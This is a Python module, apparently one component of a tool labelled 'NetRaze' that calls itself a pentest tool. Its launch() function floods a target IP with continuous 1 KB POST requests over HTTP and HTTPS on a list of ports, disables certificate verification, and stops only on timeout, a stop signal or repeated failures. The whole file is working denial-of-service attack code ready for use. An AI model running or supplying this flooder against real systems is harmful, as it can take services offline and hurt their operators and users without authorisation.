import requests
import time

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    data = {"data": "A" * 1024}
    headers = {"User-Agent": "Mozilla/5.0 (PentestTool) NetRaze"}

    start_time = time.time()
    failed = 0
    sent = 0
    consecutive_no_send = 0
    max_no_send = 10

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        iteration_sent = 0  # count successful sends in this loop iteration

        for port in port_list:
            urls = [
                f"http://{target_ip}:{port}/",
                f"https://{target_ip}:{port}/"
            ]

            for url in urls:
                try:
                    # Disable warnings for insecure HTTPS requests if needed
                    r = requests.post(url, headers=headers, data=data, timeout=3, verify=False)
                    sent += 1
                    iteration_sent += 1
                    if r.status_code >= 400:
                        failed += 1
                except Exception:
                    failed += 1

                if failed > 20:
                    fail_tracker.append(f"{tag}-{port}")
                    stop_event.set()
                    print(f"[x] {tag} on port {port} stopped due to failures.")
                    return

        if iteration_sent == 0:
            consecutive_no_send += 1
        else:
            consecutive_no_send = 0

        if consecutive_no_send >= max_no_send:
            stop_event.set()
            print(f"[x] {tag} stopped due to {consecutive_no_send} consecutive iterations with no successful sends.")
            return

    print(f"[i] {tag} finished: Sent {sent} POST requests")
